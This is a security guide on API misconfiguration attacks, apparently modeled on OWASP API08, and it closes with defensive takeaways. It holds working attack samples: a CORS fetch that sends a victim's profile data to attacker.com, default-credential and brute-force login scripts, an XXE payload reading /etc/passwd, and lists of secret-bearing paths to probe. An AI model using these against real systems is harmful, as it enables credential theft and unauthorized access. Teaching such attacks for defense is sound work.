# API08: Security Misconfiguration - Attack Vectors

## CORS Misconfiguration Exploitation

### Attack: Steal Credentials via CORS

```javascript
// Attacker's website (evil.com)
fetch('https://api.victim.com/user/profile', {
    credentials: 'include'  // Include cookies
}).then(r => r.json()).then(data => {
    // Exfiltrate to attacker
    fetch('https://attacker.com/log', {method: 'POST', body: JSON.stringify(data)});
});
```

**Works when API has**:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

## Information Disclosure via Verbose Errors

### Stack Trace Exposure

**Request**:
```http
GET /api/users/INVALID_ID
```

**Vulnerable Response**:
```json
{
  "error": "Traceback:\n  File '/app/views.py', line 42\n    user = User.query.get(user_id)\nSQLAlchemy Error: Invalid input\nDatabase: postgresql://admin:P@ssw0rd@db.internal:5432/production\nConfig: /etc/app/config.json"
}
```

**Leaked Information**:
- File paths
- Database credentials
- Internal hostnames
- Framework versions
- Config file locations

## Debug Endpoint Exploitation

### Common Debug Endpoints

```
GET /_debug
GET /_internal/metrics
GET /api/health
GET /actuator/env (Spring Boot)
GET /debug/pprof (Go)
GET /.env
```

**Example Response**:
```json
{
  "environment": "production",
  "database": {
    "host": "prod-db.internal",
    "user": "admin",
    "password": "Sup3rS3cr3t!"
  },
  "aws_key": "AKIAIOSFODNN7EXAMPLE",
  "jwt_secret": "my-secret-key-123"
}
```

## Default Credentials

### Common Defaults

```
admin/admin
root/root
administrator/password
api/api
default/default
```

### Testing Script

```python
import requests

default_creds = [
    ('admin', 'admin'),
    ('root', 'root'),
    ('administrator', 'password')
]

for username, password in default_creds:
    r = requests.post('https://api.target.com/login', 
                      json={'username': username, 'password': password})
    if r.status_code == 200:
        print(f"SUCCESS: {username}/{password}")
```

## Missing Security Headers Exploitation

### Clickjacking

**Missing**: `X-Frame-Options` or `Content-Security-Policy`

```html
<!-- Attacker's page -->
<iframe src="https://api.victim.com/transfer-money"></iframe>
<!-- Trick user into clicking inside iframe -->
```

### MIME Sniffing XSS

**Missing**: `X-Content-Type-Options: nosniff`

```
Upload file: evil.jpg (actually contains <script>)
Browser sniffs content, executes JavaScript
```

## HTTP Security Headers Attacks

### Missing HSTS

**Attack**: Strip HTTPS via MITM
```
https://api.com → http://api.com (downgrade)
```

### Missing CSP

**Attack**: Inject inline scripts
```html
<script>steal_data()</script>
```

## Configuration File Exposure

### Accessible Files

```
GET /.env
GET /config.json
GET /application.properties
GET /web.config
GET /.git/config
GET /swagger.json (may contain credentials)
```

## Unnecessary HTTP Methods

```http
OPTIONS /api/users
→ Allow: GET, POST, PUT, DELETE, TRACE, CONNECT

TRACE /api/users
→ Echoes request (can steal HttpOnly cookies)
```

## Directory Listing

```
GET /api/
→ Shows all endpoints
GET /uploads/
→ Lists all uploaded files
```

## XML External Entity (XXE) via Misconfigured Parser

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

## Server Version Disclosure

```http
Response Headers:
Server: Apache/2.4.49 (Ubuntu)
X-Powered-By: PHP/7.2.34
X-AspNet-Version: 4.0.30319
```

**Risk**: Known vulnerabilities for specific versions

## Insecure SSL/TLS Configuration

```
Accepts SSL v3 (POODLE)
Weak ciphers (RC4, DES)
No perfect forward secrecy
```

## Admin Interface Exposure

```
GET /admin
GET /phpmyadmin
GET /api/admin
GET /management
```

**Often**: No authentication, or default credentials

## Open Swagger/OpenAPI Documentation

```
GET /swagger-ui
GET /api-docs
GET /openapi.json
```

**Risk**: Complete API documentation for attackers

## Backup Files

```
GET /api.php.bak
GET /config.json.old
GET /.git
GET /db_backup.sql
```

## Session Configuration Issues

```
Cookie without Secure flag (sent over HTTP)
Cookie without HttpOnly (accessible to JavaScript)
Cookie without SameSite (CSRF vulnerable)
Long session timeout (24+ hours)
```

## Rate Limiting Absence

```python
# Try 1000 login attempts
for i in range(1000):
    requests.post('/api/login', json={'user': 'admin', 'pass': f'pass{i}'})
    # No rate limiting, brute force succeeds
```

## Key Takeaways

1. **CORS ***: Never allow all origins with credentials
2. **Verbose errors**: Hide stack traces in production
3. **Debug endpoints**: Remove before deployment
4. **Default credentials**: Always change
5. **Security headers**: Implement all
6. **Configuration files**: Never expose
7. **Regular audits**: Scan for misconfigurations
